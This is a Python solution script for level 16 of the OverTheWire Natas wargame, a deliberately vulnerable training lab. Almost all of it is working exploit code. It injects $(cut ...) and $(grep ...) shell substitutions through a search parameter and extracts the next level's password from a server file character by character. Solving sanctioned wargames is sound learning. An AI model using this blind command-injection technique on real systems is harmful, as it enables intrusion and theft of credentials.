#!/usr/bin/python3
"""

ALERT
please watch out this has spoilers if youre playing overthewire.org's natas
wargame and have interest in solving level 16 on your own.

Author: penal

"""

# i dont even know if theres a faster more efficient easier way to do this
# but anyway here goes nothing

import requests as req
from urllib import parse

host = 'http://natas16.natas.labs.overthewire.org/'
data = '?needle='

with open('creds') as creds:
    try:
        pw = creds.readline()[:-1]
    except Exception as e:
        raise(e)

session = req.Session()
session.auth = ('natas16', pw)
auth = session.post(host)


def get_body(input):
    payload = parse.quote_plus(input)
    return session.get(host+data+payload).text

    
def parse_body(body : str):
    beg = body.index('<pre>') + 6
    end = body.index('</pre>') - 1
    return body[beg : end]

def get_char(text):
    if len(text) == 0:
        # its a number
        # or something..
        # so yeah tbh idk what to do here
        # ok focus man focus
        return '#'
    else:
        return text[0]

def deal_with_the_input_string(index, thing):
    return f"^$(cut -c {index} /etc/natas_webpass/natas17 > /tmp/shityo)$(grep {thing} /tmp/shityo)penal"

def deal_with_numbers(index):
    for number in range(10):
        s = deal_with_the_input_string(index, str(number))
        text = parse_body(get_body(s))
        if len(text) == 0:
            # means number is in shityo meaning it is the number we be looking for
            return str(number)
        elif 'penal' in text:
            continue
        else:
            print("we have a situation here")
    print("not a number then wtf is it?")
    return '#'
        
def deal_with_case(index, letter):
    s = deal_with_the_input_string(index, letter.lower())
    text = parse_body(get_body(s))
    if len(text) == 0:
        # means something else got outputted other than penal
        # means letter is lower the grep worked
        return letter.lower()
    else:
        # means the grep didnt work and penal is the only thing in that string
        return letter.upper()

def get_pass():
    s = ''
    for index in range(1,33):
        c = get_char(parse_body(get_body(f"^$(cut -c {index} /etc/natas_webpass/natas17)")))
        if c=='#':
           s += deal_with_numbers(index) 
        else:
            s += deal_with_case(index, c)
    print(s)

get_pass()


